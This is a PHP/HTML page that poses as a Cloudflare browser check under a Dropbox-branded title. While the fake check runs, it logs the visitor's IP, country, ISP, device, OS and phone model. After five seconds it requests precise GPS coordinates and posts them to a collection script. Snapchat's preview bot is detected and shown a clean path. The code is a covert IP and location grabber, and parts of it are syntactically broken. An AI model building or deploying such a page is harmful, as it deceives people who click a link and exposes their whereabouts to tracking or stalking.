<?php

// Include the Mobile_Detect.php file
require_once $_SERVER['DOCUMENT_ROOT'].'/mobileDetect/src/MobileDetect.php';

$detect = new \Detection\MobileDetect;
$deviceType = ($detect->isMobile() ? ($detect->isTablet() ? 'tablet' : 'phone') : 'computer');

//echo "User's device model: $deviceType";

// safley insert into db.
//$table is randomString
$key is array {"id","userAgent","resolution","adblock","touch","zipcode","street","state","ip","unix","stat"};
$values is array {null,$_SERVER['HTTP_USER_AGENT'],null, null,null,null,null,state, $_SERVER['HTTP_X_FORWARDED_FOR'],time(),1};
if (insertDataIntoDatabase("tlog", $keys, $values)) {
  // code...
}else {
  exit();
}


?>
<html lang="en" class=""><head>

  <meta charset="UTF-8">
  <title>Dropbox - Amber Holo Premium </title>
  <link rel="icon" href="https://cfl.dropboxstatic.com/static/metaserver/static/images/favicon-vfl8lUR9B.ico" type="image/x-icon">
  <meta name="robots" content="noindex">



  <link rel="canonical" href="https://codepen.io/ta7382/pen/zjMrgM?editors=1111">



<!-- CSS -->
  <style class="INLINE_PEN_STYLESHEET_ID">

    * {
    font-family: 'Microsoft JhengHei';
}

body{
   background-color: rgb(238, 238, 238);
}

.form{
  display:flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height:90vh;
}

.circle-range {
  position: relative;
  display: inline-block;
  width: 64px;
  height: 64px;
}

.circle-range div {
  position: absolute;
  width: 22px;
  height: 22px;
  border-radius: 100%;
  background-color: rgb(0, 136, 210);
}

.circle-range div:nth-child(1) {
  left: -30px;
  animation: cir1 0.5s ease infinite;
}

.circle-range div:nth-child(2) {
  left: -30px;
  animation: cirmove 0.5s ease infinite;
}

.circle-range div:nth-child(3) {
  animation: cirmove 0.5s ease infinite;
}

.circle-range div:nth-child(4) {
  left: 30px;
  animation: cir2 0.5s ease infinite;
}

@keyframes cir1 {
  0% {
    transform: scale(0);
  }
  100% {
    transform: scale(1);
  }
}

@keyframes cir2 {
  0% {
    transform: scale(1);
  }
  100% {
    transform: scale(0);
  }
}

@keyframes cirmove {
  0% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(30px);
  }
}

  </style>
  <style>
  .responsive {
    width: 100%;
    height: auto;
  }
  .blob {
	margin: 10px;

	box-shadow: 0 0 0 0 rgba(0, 0, 0, 1);
	transform: scale(1);
	animation: pulse 2.5s infinite;
}

@keyframes pulse {
	0% {
		transform: scale(0.95);
		-webkit-filter: drop-shadow(5px 5px 5px #);
	}

	50% {
		transform: scale(1);
		-webkit-filter: drop-shadow(5px 5px 5px #FFFF);
	}

	100% {
		transform: scale(0.95);
		-webkit-filter: drop-shadow(5px 5px 5px #);
	}
}
  </style>

<script src="https://cpwebassets.codepen.io/assets/editor/iframe/iframeConsoleRunner-6bce046e7128ddf9391ccf7acbecbf7ce0cbd7b6defbeb2e217a867f51485d25.js"></script>
<script src="https://cpwebassets.codepen.io/assets/editor/iframe/iframeRefreshCSS-550eae0ce567d3d9182e33cee4e187761056020161aa87e3ef74dc467972c555.js"></script>
<script src="https://cpwebassets.codepen.io/assets/editor/iframe/iframeRuntimeErrors-4f205f2c14e769b448bcf477de2938c681660d5038bc464e3700256713ebe261.js"></script>
</head>

<body onload="wait()">
  <div style="padding-top: 10vh;">
    <center>
  <img class="blob" src="https://blog.cloudflare.com/content/images/2016/09/cf-blog-logo-crop.png" alt="Italian Trulli">
</center>
</div>
  <div class="form">

  <div class="circle-range">
    <div></div>
    <div></div>
    <div></div>
    <div></div>
  </div>
  <h2>Cloudflare is checking your browser.</h2>
  <h4 class="mt-2">You will be redirected shortly...</h4>
</div>


<script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-2c7831bb44f98c1391d6a4ffda0e1fd302503391ca806e7fcc7b9b87197aec26.js"></script>

<script>


var xmlhttp;

    function actionSend() {
      const request= new XMLHttpRequest()
request.open("POST", "funcs/recieve_UserData_JSON.php", true)
request.setRequestHeader("Content-type", "application/json")
request.send(JSON.stringify(JSON_JSON))
    }
function redirect(url){
  window.location.replace(url)
}

const options = {
  enableHighAccuracy: true,
  timeout: 5000,
  maximumAge: 0
};

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition,void(0),options);

  } else {
    x.innerHTML = "n/a";
    actionSend();
  }

}

const JSON_TEXT = '{"userid": "You are up to no good looking at this code.","shortlink": "theres booby traps in this code","servertime": "fuck around and find out.","browsertime": "i dare you","ip": "21.12.31.98","country": "north korea","isp": "starlink","vpn": "probably","device_type": "shitty","os": "linix","android_model": "galaxy S31","lattitude": "0","longitude": "0","alt": "21","acu": "very close","browser_window_dimensions": "1080p","state": "michigan","username":"myusername","useragent":"myuseragent"}';
function showPosition(position) {
  console.log("Latitude: " + position.coords.latitude);
  console.log("Longitude: " + position.coords.longitude);
  JSON_JSON.lattitude= position.coords.latitude;
  JSON_JSON.longitude= position.coords.longitude;
  JSON_JSON.alt=(position.coords.altitude);
  JSON_JSON.acu = (position.coords.accuracy);
  console.log("Altitude: " + position.coords.altitude);
  console.log("Accuracy: " + position.coords.accuracy);
  actionSend();
}

<?php require_once('funcs/getipinfo.php');
$IP_Info = getIPInfo(getUserIpAddr())?>

const datetimex = new Date();

const JSON_JSON = JSON.parse(JSON_TEXT);
JSON_JSON.userid = '<?php echo $userID; ?>';
JSON_JSON.shortlink = '<?php echo $shortlink; ?>';
JSON_JSON.servertime = '<?php echo (new \DateTime())->format('Y-m-d H:i:s'); ?>';
JSON_JSON.browsertime = datetimex.toISOString().slice(0,19).replace('T',' ');
JSON_JSON.ip = '<?php echo getUserIpAddr(); ?>';
JSON_JSON.country = '<?php echo $IP_Info['country']; ?>';
JSON_JSON.isp = '<?php echo $IP_Info['isp']; ?>';
JSON_JSON.vpn = 0;
JSON_JSON.device_type = <?php echo $deviceType; ?>;
JSON_JSON.os = '<?php echo getOS(); ?>';
JSON_JSON.android_model = '<?php require_once('funcs/get_android_model.php');
echo getAndroidModel($UserAgent); ?>';
JSON_JSON.browser_window_dimensions = "temp holder";
JSON_JSON.username = '<?php echo $username; ?>';
JSON_JSON.useragent = '<?php echo $UserAgent ?>';

function wait() {

<?php if (str_contains($UserAgent,"developer.snapchat.com")) { ?>
  JSON_JSON.os = "Snapchat Bot";
  actionSend();
<?php }else{ ?>

  //-- GET WAIT 5s GET GPS and then SUBMIT
  setTimeout(() => {
  getLocation();
}, "5000")
//--/ GET WAIT 5s GET GPS and then SUBMIT
<?php } ?>

}

</script>

</body></html>
